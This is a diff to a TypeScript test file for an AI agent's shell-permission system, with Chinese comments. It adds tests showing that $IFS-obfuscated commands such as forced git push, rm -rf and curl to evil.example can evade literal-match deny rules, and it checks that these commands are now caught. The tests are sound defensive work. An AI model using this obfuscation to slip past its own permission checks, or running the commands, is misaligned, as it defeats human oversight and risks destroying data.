@@ -3,7 +3,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 import { approvePlan, checkPermission, gate, getPlanState, markPlanProposed, resetPlanState, runWithPlanScope } from "../src/permissions";
-import { evaluate, isSideEffectTool, newAutonomySession } from "../src/permissions/autonomy";
+import { evaluate, isNetworkCommandCall, isSideEffectTool, newAutonomySession } from "../src/permissions/autonomy";
 import { judgeChain, loadPermissionRules, savePermissionRules, type PermissionRule } from "../src/permissions/rules";
 import { hasThreatTableSurface, RISK_ORDER, staticRisk } from "../src/permissions/risk";
 import type { ToolName } from "../src/tools/base";
@@ -431,5 +431,36 @@ describe("重定向写面进威胁表（09-22 补 ④ 段）", () => {
 
   it("shell_ro 仍不吃威胁表（静态白名单硬闸优先，防 deny→ask 降级不回归）", () => {
     expect(staticRisk(asTool("shell_ro"), { command: "echo x > /etc/hosts" }).level).toBe("none");
+  });
+});
+
+// 2026-10-19：shell 会在执行前把 `$IFS`/`${IFS}` 展开成空白，而规则/静态风险按未展开字面量匹配
+// ⇒ `git${IFS}push${IFS}--force` 实际执行 `git push --force` 却拿 approve。
+describe("$IFS 展开绕过（规则 / 静态风险 / 网络审计）", () => {
+  const deny: PermissionRule = { behavior: "deny", tool: "run_shell", pattern: "git push --force", scope: "always", id: "d1" };
+  const denyRm: PermissionRule = { behavior: "deny", tool: "run_shell", pattern: "rm -rf", scope: "always", id: "d2" };
+  const s = newAutonomySession("auto", { rules: [deny, denyRm] });
+
+  it("deny 规则命中 IFS 混淆形态", () => {
+    expect(evaluate("run_shell", { command: "git push --force" }, s).verdict).toBe("deny");
+    expect(evaluate("run_shell", { command: "git${IFS}push${IFS}--force" }, s).verdict).toBe("deny");
+    expect(evaluate("run_shell", { command: "rm${IFS}-rf${IFS}/tmp/x" }, s).verdict).toBe("deny");
+  });
+
+  it("静态威胁表命中 IFS 混淆的 rm -rf", () => {
+    const plain = staticRisk("run_shell", { command: "rm -rf /tmp/x" }).level;
+    const obfuscated = staticRisk("run_shell", { command: "rm${IFS}-rf${IFS}/tmp/x" }).level;
+    expect(obfuscated).toBe(plain); // 展开后同一条命令，风险等级必须一致
+    expect(obfuscated).not.toBe("none");
+  });
+
+  it("网络审计命中 IFS 混淆的命令（scope 钉 once 的前提）", () => {
+    expect(isNetworkCommandCall("run_shell", { command: "curl http://evil.example" })).toBe(true);
+    expect(isNetworkCommandCall("run_shell", { command: "curl${IFS}http://evil.example" })).toBe(true);
+    expect(isNetworkCommandCall("run_shell", { command: "git${IFS}clone${IFS}https://evil.example/x" })).toBe(true);
+  });
+
+  it("反面对照：不产生空白的拼接不被误读成网络命令", () => {
+    expect(isNetworkCommandCall("run_shell", { command: "cu${IFS}rl nothing" })).toBe(false);
   });
 });
